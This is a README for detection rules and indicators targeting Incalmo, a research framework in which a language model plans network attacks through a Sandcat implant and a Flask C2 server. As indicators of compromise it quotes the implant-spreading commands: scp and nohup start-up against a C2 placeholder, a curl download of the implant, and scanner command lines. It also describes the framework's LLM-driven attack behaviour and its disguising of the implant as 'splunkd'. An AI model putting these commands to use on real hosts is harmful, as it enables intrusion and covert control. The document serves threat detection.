# Incalmo Detection Rules and IOCs

Part of [Agentic Attack Detections](../../README.md). Shared indicators and feeds live at the repository root; the rules for behaviors that every agentic framework shows are in [`behaviors/`](../../behaviors).

Detection rules, hunting queries and indicators for **Incalmo** ([cylabcyberautonomy/Incalmo](https://github.com/cylabcyberautonomy/Incalmo), reviewed at `8cd02e0e`, November 2, 2026), a research system from Carnegie Mellon CyLab in which a language model plans a multi-host network attack through a set of high-level actions (scan, lateral move, escalate privilege, find information, exfiltrate) and an action layer turns each one into shell commands. The commands run on compromised hosts through MITRE Caldera's Sandcat implant, which talks to Incalmo's own Flask C2 server on port 8888. The paper is [arXiv 2501.16466](https://arxiv.org/abs/2501.16466). No vendor or CERT report of Incalmo in a real intrusion was found on November 26, 2026, so this folder is built from the source code alone: it finds Incalmo's implant spreading across your hosts, the C2 server and its operator API on the wire, and an exposed C2 server.

| | |
|---|---|
| Platforms | Microsoft Sentinel and Defender XDR, Sigma, Suricata, Zeek intel, YARA, STIX 2.1 |
| Docs | [What Incalmo leaves behind](source-code-signals.md), with a file and line for every signal |
| Status | Experimental. Written from the source code; Suricata rules have test flows. Baseline every rule on your own data before alerting |

## What Incalmo leaves behind

The short version. The full review is in [source-code-signals.md](source-code-signals.md).

| Signal | What it looks like | Code |
|---|---|---|
| C2 server | Flask on `0.0.0.0:8888`, no authentication, CORS `*`. `GET /` answers `{"message": "Incalmo C2 Server API"}`; `/health` answers `"server": "Flask + Celery"` with `running_strategies`. Both compose files publish 8888 on every interface | `incalmo/c2server/c2server.py:45-46,152-188`, `docker/docker-compose.yml:41` |
| Implant protocol | Caldera Sandcat contact over HTTP: `POST /beacon` with a base64 JSON body; the answer is base64 of `{"paw": "...", "sleep": 3, "watchdog": 60, "instructions": ...}`, so it starts `eyJwYXciOiAi`. Payloads come from `POST /file/download` with a `File` header | `incalmo/c2server/routes/agent_routes.py:31-92`, `incalmo/c2server/routes/file_routes.py:14-34` |
| Per-command scripts | Every command is written to `dynamic_payload_<C2 port>_<paw>.sh` (or `manual_command_<port>.sh`, `kill_agent.sh`), fetched by the implant and run with `sh` | `incalmo/c2server/routes/command_routes.py:47,94`, `agent_routes.py:115-130` |
| Spreading the implant | `scp ... sandcat.go-linux <host>:~/sandcat_tmp.go`, then `nohup ./sandcat_tmp.go -server <C2> -group red >/tmp/sc.log`, after `curl -s -m 5 -o /dev/null -w C2:%{http_code} <C2>/`. Or `curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" <C2>/file/download` over ssh. The model's prompts tell it to save the implant as `splunkd` | `incalmo/core/actions/LowLevel/ssh_lateral_move.py:16-25`, `ssh_spawn_agent.py:13-16`, `HighLevel/llm_agents/*/preprompt.txt` |
| Tool command lines | `nmap --max-rtt-timeout 100ms -sn ... -oX -`, `nmap -sV --version-light -oX -`, `nikto ... -Tuning 8 -maxtime 60s -timeout 3`, `nuclei -u <h>:<p> -timeout 5 -severity critical -j -silent`, `ncat --no-shutdown -i 5s` | `incalmo/core/actions/LowLevel/` |
| C2 host | `uv run ./incalmo/c2server/c2server.py`, Celery `incalmo.c2server.celery.celery_worker` worker and beat, `msfrpcd -P password` in the attacker container, `/tmp/state_store.db`, run logs in `output/<name>_<id>_<date>/` | `docker/attacker/start.sh`, `incalmo/c2server/state_store.py:9` |
| Console | A create-react-app dev server on port 3000 with title `Incalmo` and the stock React favicon (Shodan hash `-2009722838`), which calls the C2 API at `http://localhost:8888` | `incalmo/frontend/incalmo-ui/public/index.html:30` |

## What is in this folder

| Folder | Contents |
|---|---|
| [`sentinel/hunting/`](sentinel/hunting) | 4 KQL hunts: Incalmo's C2 host, the implant and its commands on your hosts, the C2 protocol and API in network logs, and the watchlist sweep |
| [`sentinel/analytics/`](sentinel/analytics) | 1 scheduled rule: the Incalmo implant being started or its per-command scripts being run |
| [`sigma/`](sigma) | 5 Sigma rules: the C2 server, implant start-up, its command lines, its files, and its API in proxy logs |
| [`suricata/`](suricata) | Rules for the C2 server's answers, the Sandcat beacon and downloads, Incalmo's per-command scripts and the operator API |
| [`yara/`](yara) | Rules for the Incalmo source and its prompts and run configuration |

Out-of-band lookups, attack tools started by an agent, model traffic from servers and the rest are in [`behaviors/`](../../behaviors). Indicators are in [`../../iocs/indicators.csv`](../../iocs/indicators.csv) with `framework` set to `incalmo`.

## Limits

- The implant is Caldera's Sandcat and the beacon and download routes copy Caldera's contact protocol. Rules on `/beacon`, `/file/download` and the `sandcat.go` name also fire on Caldera itself; the rules that name `dynamic_payload_`, the Incalmo payload scripts, the operator API or the root JSON are Incalmo's own.
- Incalmo is built for lab ranges (its Equifax-style test network, MHBench) and is driven by researchers. A match means Incalmo, not an attacker: check who ran it.
- The `splunkd` file name and the curl one-liner are examples in the model's prompts; the model can choose other names.
- The implant binary and the exploit scripts under `incalmo/c2server/payloads/` and `incalmo/c2server/agents/` were not read for this review. Only their names, and how Incalmo's own code calls them, are used.
